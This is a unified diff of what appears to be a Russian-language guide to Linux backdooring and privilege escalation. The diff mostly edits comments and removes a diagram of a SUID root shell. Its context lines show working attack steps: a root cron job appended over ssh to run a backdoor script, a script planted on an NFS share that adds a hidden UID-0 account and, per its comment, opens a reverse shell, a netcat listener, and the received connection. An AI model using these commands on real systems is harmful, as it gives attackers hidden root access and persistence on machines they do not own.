@@ -1834,12 +1834,6 @@ ssh user@192.168.1.100 "echo '* * * * * root /public/backdoor.sh' | sudo tee -a 
 1. **Механизм SUID в Linux**:
    - Когда файл с установленным SUID-битом запускается, процесс получает права владельца файла
    - В данном случае владелец - root, значит процесс запустится с root-правами
-   ```mermaid
-   graph LR
-   A[Пользователь] --> B[Запуск .hidden_shell]
-   B --> C[Процесс с EUID=0]
-   C --> D[Полный доступ к системе]
-   ```
 
 2. **Работа cron в Linux**:
    - Системный демон, выполняющий задачи по расписанию
@@ -1960,7 +1954,7 @@ cat /mnt/nfs_scripts/daily_backup.sh
 cat << 'EOF' | sudo tee /mnt/nfs_scripts/evil_backdoor.sh
 #!/bin/bash
 
-# 1. Добавление скрытого пользователя
+# 1. Добавление скрытого пользователя (пароль P@ssw0rd)
 echo "backdoor:\$6\$salt\$hash:0:0:root:/root:/bin/bash" >> /etc/passwd
 
 # 2. Обратный шелл для немедленного доступа
@@ -2031,7 +2025,7 @@ ls -l /mnt/nfs_scripts/daily_backup.sh
 nc -nvlp 4444
 ```
 
-**После выполнения скрипта (обычно ночью):**
+**Результат выполнения скрипта:**
 ```
 Connection received from 192.168.1.100 45678
 bash: cannot set terminal process group (1234): Inappropriate ioctl for device
